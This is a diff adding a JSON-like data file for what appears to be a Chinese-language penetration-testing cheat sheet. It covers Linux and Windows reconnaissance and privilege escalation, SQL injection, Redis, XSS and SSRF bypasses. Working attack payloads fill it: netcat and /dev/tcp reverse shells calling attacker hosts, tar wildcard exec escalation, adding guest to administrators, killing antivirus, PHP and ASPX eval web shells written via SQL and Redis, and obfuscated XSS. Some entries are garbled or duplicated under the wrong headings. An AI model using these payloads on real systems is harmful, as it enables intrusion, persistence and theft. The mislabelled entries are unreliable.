@@ -1,0 +1,899 @@
+getData([
+	{
+		"left-nav-title": "Linux",
+		"card-item-content": [{
+				"card-item-header": "常用命令",
+				"card-item-body": [{
+						"card-item-h4": "查看系统版本",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"cat /etc/issue",
+								"cat /etc/*-release",
+								"cat /etc/lsb-release",
+								"cat /etc/redhat-release"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								""
+							]
+						}]
+					},
+					{
+						"card-item-h4": "查看内核版本",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"cat /proc/version",
+								"uname -a",
+								"uname -mrs",
+								"rpm -q kernel",
+								"dmesg | grep Linux",
+								"ls /boot | grep vmlinuz"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								"",
+								""
+							]
+						}]
+					},
+					{
+						"card-item-h4": "查看环境变量",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"cat /etc/profile",
+								"cat /etc/bashrc",
+								"cat ~/.bash_profile",
+								"cat ~/.bashrc",
+								"cat ~/.bash_logout",
+								"env",
+								"set"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								""
+							]
+						}]
+					},
+					{
+						"card-item-h4": "查看服务设置",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"cat /etc/syslog.conf",
+								"cat /etc/chttp.conf",
+								"cat /etc/lighttpd.conf",
+								"cat /etc/cups/cupsd.conf",
+								"cat /etc/inetd.conf",
+								"cat /etc/apache2/apache2.conf",
+								"cat /etc/my.conf",
+								"cat /etc/httpd/conf/httpd.conf",
+								"cat / opt / lampp / etc / httpd.conf ",
+								"ls - aRl / etc / | awk‘ $1~/^.*r.*/"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								""
+							]
+						}]
+					},
+					{
+						"card-item-h4": "查看计划任务",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"crontab -l",
+								"ls -alh /var/spool/cron",
+								"ls -al /etc/ | grep cron",
+								"ls -al /etc/cron*",
+								"cat /etc/cron*",
+								"cat /etc/at.allow",
+								"cat /etc/at.deny",
+								"cat /etc/cron.allow",
+								"cat /etc/cron.deny",
+								"cat /etc/crontab",
+								"cat /etc/anacrontab",
+								"cat /var/spool/cron/crontabs/root"
+
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								""
+							]
+						}]
+					}
+
+				]
+			},
+			{
+				"card-item-header": "网络相关",
+				"card-item-body": [{
+						"card-item-h4": "查看网络信息",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"netstat -antup",
+								"netstat -tulpn",
+								"lsof -i :80",
+								"grep 80 /etc/services",
+								"ss -nt"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								""
+							]
+						}]
+					},
+					{
+						"card-item-h4": "ssh端口转发",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"ssh -L 8080:192.168.1.6:80 root@192.168.1.7",
+								"ssh -R 8080:192.168.1.6:80 root@192.168.1.7",
+								"ssh -D 1080 -fN 192.168.1.7"
+							],
+							"annotation": [
+								"正向代理",
+								"反向代理",
+								""
+							]
+						}]
+					},
+					{
+						"card-item-h4": "管道",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port]>backpipe",
+								"mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port]>backpipe",
+								"mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe",
+								"backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc",
+								"localhost 80 | tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080)"
+
+							],
+							"annotation": [
+								"",
+								"",
+								"Proxy (Port 80 to 8080)",
+								"",
+								""
+							]
+						}]
+					}
+
+				]
+			},
+			{
+				"card-item-header": "权限提升",
+				"card-item-body": [{
+						"card-item-h4": "通配符提权",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1234 >/tmp/f\" > shell.sh",
+								"touch \"/var/www/html/--checkpoint-action=exec=sh shell.sh\"",
+								"touch \"/var/www/html/--checkpoint=1\""
+							],
+							"annotation": [
+								"",
+								"",
+								""
+							]
+						}]
+					},
+					{
+						"card-item-h4": "SUID",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"find / -user root -perm /4000 2>/dev/null",
+								"touch \"/var/www/html/--checkpoint-action=exec=sh shell.sh\"",
+								"touch \"/var/www/html/--checkpoint=1\""
+							],
+							"annotation": [
+								"",
+								"",
+								""
+							]
+						}]
+					}
+				]
+			},
+			{
+				"card-item-header": "其他",
+				"card-item-body": [{
+						"card-item-h4": "iptables",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"iptables -A INPUT -p tcp --dport 3306 -j DROP",
+								"iptables -A INPUT -p tcp --dport 3306 -j ACCEPT"
+							],
+							"annotation": [
+								"",
+								""
+							]
+						}]
+					}
+				]
+			}
+		]
+	},
+	{
+		"left-nav-title": "Windows",
+		"card-item-content": [{
+				"card-item-header": "常用命令",
+				"card-item-body": [{
+						"card-item-h4": "查看系统信息",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"winver",
+								"ver",
+								"systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"",
+								"net config workstation",
+								"wmic os get buildnumber,caption,CSDVersion /format:csv",
+								"type C:\\\\windows\\system32\\drivers\\etc\\hosts",
+								"type C:\\\\windows\\system32\\inetsrv\\config\\applicationHost.config",
+								"echo %PROCESSOR_ARCHITECTURE%"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"如果安装iis服务器可以查看iis配置信息",
+								"查看系统架构"
+							]
+						}]
+					},
+					{
+						"card-item-h4": "查看用户信息",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"query user || qwinsta",
+								"query session",
+								"whoami /all",
+								"net user",
+								"net localgroup",
+								"net user guest 1!2@3#Hack1111111 /active:yes",
+								"net localgroup administrators guest /add"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"这一步一般都会触发告警"
+							]
+						}]
+					},
+					{
+						"card-item-h4": "进程与服务",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"wmic product get name,version",
+								"tasklist /svc",
+								"whoami /all",
+								"wmic /Node:localhost /Namespace:\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List",
+								"wmic startup get command,caption",
+								"sc query state= all | findstr /I \"mysq\"",
+								"sc \\\\127.0.0.1 qc w32time",
+								"taskkill /f /im av.exe"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"查看AV安装情况",
+								"",
+								"",
+								"不建议使用，触发告警",
+								"大部分杀不掉"
+							]
+						}]
+					}
+				]
+			},
+			{
+				"card-item-header": "网络相关",
+				"card-item-body": [{
+						"card-item-h4": "查看网络信息",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"ipconfig /all",
+								"arp -A",
+								"net share",
+								"Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State",
+								"wmic share get name,path,status",
+								"netstat -ano",
+								"REG QUERY \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"通过注册表查看代理情况"
+							]
+						}]
+					},
+					{
+						"card-item-h4": "代理隧道",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"netsh interface portproxy show all",
+								"netsh interface portproxy add v4tov4 listenport=22 connectaddress=ip connectport=port",
+								"netsh interface portproxy delete v4tov4 listenport=port",
+								"netsh winhttp show proxy"
+							],
+							"annotation": [
+								"",
+								"添加一个IPV4到IPV4的端口映射",
+								"删除指定转发端口",
+								"查看代理"
+							]
+						}]
+					}
+				]
+			},
+			{
+				"card-item-header": "权限提升",
+				"card-item-body": [{
+						"card-item-h4": "NC提权",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"nc -lvvp 8080",
+								"nc -vv [attack_ip] 8080 -e	 C:\\\\Windows\\System32\\cmd.exe"
+							],
+							"annotation": [
+								"",
+								""
+							]
+						}]
+					}
+				]
+			},
+			{
+				"card-item-header": "其他",
+				"card-item-body": [{
+						"card-item-h4": "其他查询命令",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"schtasks /query /fo list /v",
+								"net statistics workstation",
+								"Get-PSDrive | where {$_.Provider -like \"Microsoft.PowerShell.Core\\FileSystem\"}| ft Name,Root",
+								"netsh firewall show state"
+							],
+							"annotation": [
+								"查询所有的计划任务",
+								"查看主机开机时间",
+								"Powershell查询驱动器连接信息",
+								""
+							]
+						}]
+					},
+					{
+						"card-item-h4": "RDP配置",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"REG query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server\\WinStations\\RDP-Tcp /v PortNumber",
+								"set /a a=0xd3d",
+								"set /a a=0xd3d"
+							],
+							"annotation": [
+								"查询RDP端口",
+								"在查询之后，设置RDP端口",
+								"开启RDP服务"
+							]
+						}]
+					}
+				]
+			}
+
+		]
+	},
+	{
+		"left-nav-title": "SQL injection",
+		"card-item-content": [{
+				"card-item-header": "常用",
+				"card-item-body": [{
+					"card-item-h4": " ",
+					"card-item-content-h4": [{
+							"content-h4": [
+								"'or\"",
+								"-- or #",
+								"' OR 1 -- -",
+								"'1||0||3'",
+								"/*…*/",
+								"' AND userid IS NULL; --",
+								"' waitfor delay '0:0:10'--",
+								"'order by 3--+",
+								"declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								""
+
+							]
+						}
+
+					]
+				}]
+			},
+			{
+				"card-item-header": "MYSQL",
+				"card-item-body": [{
+					"card-item-h4": "基础查询",
+					"card-item-content-h4": [{
+							"content-h4": [
+								"'and extractvalue(1,concat(0x7e,(select @@version),0x7e))# ",
+								"'or updatexml(1,concat(0x7e,(select @@version),0x7e),1) or '",
+								"order by if(1=2,1,(select @@version))-- +",
+								"order by rand(ascii(mid((select database()),1,1))>96)-- +",
+								"order by extractvalue(1,if(1=2,1,user()))--+",
+								"'union select 1,2,\"<?php @eval($_GET['string'])?>\" into outfile \"D:\\WWW\\1.php\" --+",
+								"'select*from(select+sleep(2)union/**/select+1)a-- +"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								""
+							]
+						}
+
+					]
+				}]
+			},
+			{
+				"card-item-header": "SQLserver",
+				"card-item-body": [{
+					"card-item-h4": "基础查询",
+					"card-item-content-h4": [{
+							"content-h4": [
+								"and exists (select * from sysobjects)",
+								"and 1=(select @@VERSION)",
+								"and 1=(select db_name())",
+								"and 1=(select IS_SRVROLEMEMBER('sysadmin'))",
+								"and 1=(Select IS_MEMBER('db_owner'))",
+								"and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype = 'X' AND name = 'xp_cmdshell')",
+								"declare @shell int exec sp_oacreate 'wscript.shell',@shell output	exec sp_oamethod @shell,'run',null,'whoami'"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								""
+							]
+						}
+
+					]
+				}]
+			},
+			{
+				"card-item-header": "Oracle",
+				"card-item-body": [{
+					"card-item-h4": "基础查询",
+					"card-item-content-h4": [{
+							"content-h4": [
+								"and (select*from v$version)>0 --",
+								"and (select count (*) from dual)>0 --",
+								"and 1=utl_inaddr.get_host_name((select user from dual))--",
+								"and 1=ctxsys.drithsx.sn(1,(select user from dual))--",
+								"and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --",
+								"and (select dbms_xdb_version.checkin((select user from dual)) from	dual) is not null --",
+								"and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null --",
+								"and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null --",
+								"and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual))	from dual) is not null --",
+								"and 1=ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)--",
+								"and 1=(select decode(substr(user,1,1),'S',(1/0),0) from dual) --",
+								"or 1= dbms_pipe.receive_message('RDS', 10)--",
+								"and 1=(select decode(substr(user,1,1),'S',dbms_pipe.receive_message('RDS',5),0) from dual) --",
+								"and 1=(select decode(substr(user,1,1),'S',(select count(*) from all_objects),0) from dual) and '1'='1' --"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								""
+							]
+						}
+
+					]
+				}]
+			},
+			{
+				"card-item-header": "Redis",
+				"card-item-body": [{
+						"card-item-h4": "Getshell",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"config set dir E:/www/font",
+								"config set dbfilename redis2.aspx",
+								"set a \"<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"c\"],\"unsafe\");%>\"",
+								"save"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								""
+							]
+						}]
+					},
+					{
+						"card-item-h4": "反弹shell",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"set x \"\n\n* * * * * bash -i >& /dev/tcp/192.168.106.133/7999	0>&1\n\n\"",
+								"config set dir /var/spool/cron/",
+								"config set dbfilename root",
+								"save"
+							],
+							"annotation": [
+								"",
+								"ubantu目录:/var/spool/cron/crontabs/",
+								"",
+								""
+							]
+						}]
+					},
+					{
+						"card-item-h4": "免密登录",
+						"card-item-content-h4": [{
+								"content-h4": [
+									"config set dir E:/www/font",
+									"config set dbfilename redis2.aspx",
+									"set a \"<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"c\"],\"unsafe\");%>\"",
+									"and 1=ctxsys.drithsx.sn(1,(select user from dual))--",
+									"save"
+								],
+								"annotation": [
+									"",
+									"",
+									"",
+									"",
+									""
+								]
+							}
+
+						]
+					}
+				]
+			},
+		]
+	},
+	{
+		"left-nav-title": "XSS",
+		"card-item-content": [
+			{
+				"card-item-header": "常用",
+				"card-item-body": [{
+						"card-item-h4": "",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"'\"><h1>test</h1>",
+								"'\"><hr />",
+								"'\"><img src=x onerror=x>",
+								"'\"><img src=x onerror=alert(6)>",
+								"'\"><brute contenteditable onblur=alert(1)>lose focus!",
+								"'\"><svg><script xlink:href=data:,alert(1)></script>",
+								"'\"><svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=%26></animate>",
+								"'\"><details open ontoggle=top[8680439..toString(30)](1); >",
+								"'\"><meta name=\"language\" content=\"0;http://www.baidu.com\"HTTP-EQUIV=\"refresh\"\" />"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"跳转"
+							]
+						}]
+					}
+					
+				]
+			},
+			{
+				"card-item-header": "编码绕过",
+				"card-item-body": [{
+						"card-item-h4": "AAencode",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"'\"><img src=x onerror=\"ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ ['_']; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)],ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\'';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+/*´∇｀*/(ﾟДﾟ)[ﾟoﾟ]+						(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) +						(ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+((o^_^o)						- (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) +						(ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) +	(ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ))('_');\">"
+							],
+							"annotation": [
+								"http://www.atoolbox.net/Tool.php?Id=703"
+							]
+						}]
+					},
+					{
+						"card-item-h4": "JsFuck",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"'\"><img src=x onerror=\"[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])\">"
+							],
+							"annotation": [
+								"http://www.jsfuck.com/"								
+							]
+						}]
+					},
+					{
+						"card-item-h4": "JJencode",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"'\"><img src=x onerror=\"$=~[];$={___:++$,$$$$:(![]+'')[$],__$:++$,$_$_:(![]+'')[$],_$_:++$,$_$$:({}+'')[$],$$_$:($[$]+'')[$],_$$:++$,$$$_:(!''+'')[$],$__:++$,$_$:++$,$$__:({}+'')[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+'')[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+'')[$.__$])+((!$)+'')[$._$$]+($.__=$.$_[$.$$_])+($.$=(!''+'')[$.__$])+($._=(!''+'')[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!''+'')[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+'\\''+$.$_$_+(![]+'')[$._$_]+$.$$$_+'\\\\'+$.__$+$.$$_+$._$_+$.__+'('+$.$$_+')'+'\\'')())();\">"
+							],
+							"annotation": [
+								"http://www.atoolbox.net/Tool.php?Id=704"								
+							]
+						}]
+					},
+					{
+						"card-item-h4": "楔形文字",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"'\"><img src=x onerror=\"𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀] +(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀] +𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+'(𒀀)')()\">"
+							],
+							"annotation": [
+								""								
+							]
+						}]
+					}
+				]
+			}
+		]
+	},
+	{
+		"left-nav-title": "SSRF",
+		"card-item-content": [{
+				"card-item-header": "协议利用",
+				"card-item-body": [{
+						"card-item-h4": "协议利用",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"dict://test.org:8080/helo:dict",
+								"gopher://test.org:8080/gopher",
+								"file:///etc/passwd",
+								"http://[::1]"
+							],
+							"annotation": [
+								"Dict协议",
+								"Gopher协议",
+								"File协议",
+								"ipv6协议"
+							]
+						}]
+					}
+				]
+			},
+			{
+				"card-item-header": "进制转换",
+				"card-item-body": [{
+						"card-item-h4": "8进制格式",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"0300.0250.0.1"
+							],
+							"annotation": [
+								"192.168.0.1"
+							]
+						}]
+					},
+					{
+						"card-item-h4": "16进制",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"0xC0.0xA8.0.1"
+							],
+							"annotation": [
+								"192.168.0.1"
+							]
+						}]
+					},
+					{
+						"card-item-h4": "10进制整数格式",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"3232235521"
+							],
+							"annotation": [
+								"192.168.0.1"
+							]
+						}]
+					},
+					{
+						"card-item-h4": "16进制整数格式",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"0xC0A80001"
+							],
+							"annotation": [
+								"192.168.0.1"
+							]
+						}]
+					},
+					{
+						"card-item-h4": "省略格式",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"10.1"
+							],
+							"annotation": [
+								"10.0.0.1"
+							]
+						}]
+					}
+
+				]
+			},
+			{
+				"card-item-header": "解析不当",
+				"card-item-body": [{
+						"card-item-h4": "特殊符号绕过",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"http://www.baidu.com@192.168.0.1/",
+								"http://127。1。1。1/"
+							],
+							"annotation": [
+								"",
+								""
+							]
+						}]
+					},
+					{
+						"card-item-h4": "指向XIP.IO",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"http://127.0.0.1.xip.io/"
+							],
+							"annotation": [
+								""
+							]
+						}]
+					},
+					{
+						"card-item-h4": "短地址",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"http://1il70.cn/1QFuu"
+							],
+							"annotation": [
+								" http://127.0.0.1   # 短地址生成平台：http://tool.chinaz.com/Tools/dwz.aspx"
+							]
+						}]
+					},
+					{
+						"card-item-h4": "封闭式数字字母",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ",
+								"① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿"
+							],
+							"annotation": [
+								"example.com",
+								""
